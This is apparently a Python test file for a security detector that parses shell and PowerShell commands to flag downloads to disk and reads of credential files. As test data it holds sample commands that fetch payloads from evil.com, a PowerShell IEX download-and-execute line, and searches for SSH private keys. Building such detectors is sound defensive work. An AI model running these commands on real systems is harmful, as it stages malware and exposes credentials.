"""Independent validation of ast_parse.py (Phase 1, overnight session).
Run:
    python -m parliament.test_ast_parse
Tests AST-SPECIFIC robustness: cases where a naive tokenizer (struct_parse.py)
gets the wrong answer because it can't distinguish executed code from
comments/heredoc bodies/string-literal contents, but a real grammar parser
does. Also confirms fallback correctness for command_prompt (no real parser
available for cmd.exe -- confirmed via direct test, see ast_parse.py's module
docstring) and confirms every case that struct_parse.py already got right
still gets the same right answer through the AST path (no regression)."""
from parliament.ast_parse import is_network_fetch_to_disk, has_credential_path
from parliament import struct_parse as sp

# (label, cmd, dialect, expect_fetch_to_disk, expect_used_ast)
AST_FETCH_CASES = [
    # The concrete bug found tonight: struct_parse.py's tokenizer flags a
    # curl command appearing only inside a heredoc BODY as a real fetch,
    # because it textually scans the whole string. bashlex correctly scopes
    # heredoc content into HeredocNode.value, never a CommandNode -- so this
    # word never reaches the AST walk at all.
    ("heredoc body, must NOT fire (AST-only fix)",
     "cat <<EOF\ncurl -o out.txt http://evil.com/payload\nEOF", "sh", False, True),
    # A URL/command-looking string that's actually a single string-literal
    # ARGUMENT to `echo`, not a real curl invocation. Both the tokenizer and
    # the AST get this one right (documented for completeness, not a fix).
    ("url inside a quoted string argument, must NOT fire",
     'echo "see curl http://evil.com/payload for docs"', "sh", False, True),
    # A genuinely commented-out PowerShell line. PowerShell's own parser
    # drops comment text before the AST exists -- confirmed zero CommandAst/
    # InvokeMemberExpressionAst nodes result.
    ("PowerShell full-line comment, must NOT fire",
     "# (New-Object Net.WebClient).DownloadFile('http://evil.com/x.exe','C:\\x.exe')",
     "powershell", False, True),
    # Real .NET method-invocation-shaped fetch-to-disk. This is NOT a
    # CommandAst (no bareword `Verb-Noun` call) -- it's an
    # InvokeMemberExpressionAst on a parenthesized expression. Confirmed
    # necessary: a CommandAst-only walk misses this shape entirely.
    ("PowerShell .DownloadFile() method call, MUST fire",
     "(New-Object Net.WebClient).DownloadFile('http://evil.com/x.exe','C:\\x.exe')",
     "powershell", True, True),
    # IEX + DownloadString is fetch-to-MEMORY-then-execute (E2 territory),
    # not fetch-to-DISK (E1). Confirms the AST path doesn't over-fire just
    # because a URL and a WebClient method call are both present.
    ("PowerShell IEX+DownloadString (fetch-to-memory, not disk), must NOT fire E1",
     "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/run.ps1')",
     "powershell", False, True),
    # Plain command-shaped real fetch, still correct through the AST path
    # (regression check against struct_parse.py's own FETCH_POSITIVE).
    ("plain curl -o, still correct via AST",
     "curl -o /tmp/p.exe http://evil.com/p.exe", "sh", True, True),
    # command_prompt (cmd.exe): confirmed via direct test that bashlex
    # raises ParsingError on real cmd.exe batch syntax and PowerShell's
    # parser doesn't apply either -- must fall back to the tokenizer, not
    # silently claim an AST result.
    # command_prompt (cmd.exe) falls back to the tokenizer. Target carries an
    # executable extension so it remains a genuine payload-staging POSITIVE
    # after the E1 curl -o FP fix (a `.txt` data target would now correctly
    # NOT fire -- see test_struct_parse.py's FETCH_NEGATIVE additions).
    ("command_prompt falls back to tokenizer (no cmd.exe AST available)",
     "curl -o payload.exe http://evil.com/payload", "command_prompt", True, False),
]

AST_CRED_CASES = [
    ("credential search, real AST path",
     "find / -name id_rsa", "sh", True, True),
    ("config-key NAME in prose, must NOT fire (same as tokenizer)",
     'echo "the api.key setting"', "sh", False, True),
    ("PowerShell commented-out credential read, must NOT fire",
     "# cat ~/.ssh/id_rsa", "powershell", False, True),
]


def _run():
    fails = []
    print("=== AST-backed E1 network-fetch-to-disk ===")
    for label, cmd, dialect, expect_fetch, expect_used_ast in AST_FETCH_CASES:
        matched, evidence, used_ast = is_network_fetch_to_disk(cmd, dialect)
        ok = matched == expect_fetch and used_ast == expect_used_ast
        if not ok:
            fails.append(("fetch", label, cmd, expect_fetch, matched, expect_used_ast, used_ast, evidence))
        print(f"  [{'OK ' if ok else 'FAIL'}] {label:<62} -> matched={matched} used_ast={used_ast}"
              f" {('('+evidence+')') if evidence else ''}")

    print("\n=== AST-backed V1/V2 credential-path ===")
    for label, cmd, dialect, expect_cred, expect_used_ast in AST_CRED_CASES:
        matched, evidence, used_ast = has_credential_path(cmd, dialect)
        ok = matched == expect_cred and used_ast == expect_used_ast
        if not ok:
            fails.append(("cred", label, cmd, expect_cred, matched, expect_used_ast, used_ast, evidence))
        print(f"  [{'OK ' if ok else 'FAIL'}] {label:<62} -> matched={matched} used_ast={used_ast}"
              f" {('('+evidence+')') if evidence else ''}")

    print("\n=== Non-regression: struct_parse.py's own FETCH/CRED cases still agree via AST path (sh dialect) ===")
    from parliament.test_struct_parse import FETCH_POSITIVE, FETCH_NEGATIVE, CRED_POSITIVE, CRED_NEGATIVE
    for label, cmd, expect in FETCH_POSITIVE + FETCH_NEGATIVE:
        tok_matched, _ = sp.is_network_fetch_to_disk(cmd)
        ast_matched, _, _ = is_network_fetch_to_disk(cmd, "sh")
        ok = tok_matched == ast_matched == expect
        if not ok:
            fails.append(("fetch-nonregr", label, cmd, expect, ast_matched, None, None, None))
        print(f"  [{'OK ' if ok else 'FAIL'}] {label:<32} tokenizer={tok_matched} ast={ast_matched}")
    for label, cmd, expect in CRED_POSITIVE + CRED_NEGATIVE:
        tok_matched, _ = sp.has_credential_path(cmd)
        ast_matched, _, _ = has_credential_path(cmd, "sh")
        ok = tok_matched == ast_matched == expect
        if not ok:
            fails.append(("cred-nonregr", label, cmd, expect, ast_matched, None, None, None))
        print(f"  [{'OK ' if ok else 'FAIL'}] {label:<32} tokenizer={tok_matched} ast={ast_matched}")

    total = len(AST_FETCH_CASES) + len(AST_CRED_CASES) + len(FETCH_POSITIVE) + len(FETCH_NEGATIVE) + len(CRED_POSITIVE) + len(CRED_NEGATIVE)
    print(f"\n{total-len(fails)}/{total} passed.")
    if fails:
        print("\nFAILURES (reported honestly):")
        for f in fails:
            print(f"  {f}")
        return 1
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(_run())
